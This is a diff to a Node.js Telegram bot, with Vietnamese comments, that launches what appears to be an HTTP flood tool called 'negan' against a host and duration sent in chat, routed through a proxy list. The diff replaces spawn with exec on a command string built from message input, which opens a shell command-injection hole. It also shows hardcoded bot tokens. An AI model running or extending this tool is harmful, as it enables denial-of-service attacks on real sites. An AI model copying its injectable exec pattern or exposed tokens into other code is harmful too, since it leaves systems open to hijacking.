@@ -1,8 +1,8 @@
 const TelegramBot = require('node-telegram-bot-api');
-const { spawn } = require('child_process');
+const { exec } = require('child_process'); // Sử dụng exec thay vì spawn
 const os = require('os');
 
-const token = '8129263243:AAFApr9Z8EapobeJQoPK9hF-FdjLekrxujc';
+const token = '7534473375:AAHVzsloZ9NGTIyknxKERIz5utDIkRkA9J4';
 const bot = new TelegramBot(token, { polling: true });
 const adminId = 7371969470;
 
@@ -50,8 +50,8 @@ bot.on('message', (msg) => {
     const command = `node ./negan -m GET -u ${host} -p live.txt --full true -s ${time}`;
     console.log(`[DEBUG] Lệnh được thực thi: ${command}`);
 
-    // Sử dụng spawn để thực thi lệnh
-    const child = spawn('node', ['./negan', '-m', 'GET', '-u', host, '-p', 'live.txt', '--full', 'true', '-s', time]);
+    // Sử dụng exec để thực thi lệnh
+    const child = exec(command);
 
     // Gửi thông báo thành công ngay lập tức
     bot.sendMessage(chatId, `🚀 Lệnh đã được gửi thành công: ${command}`);
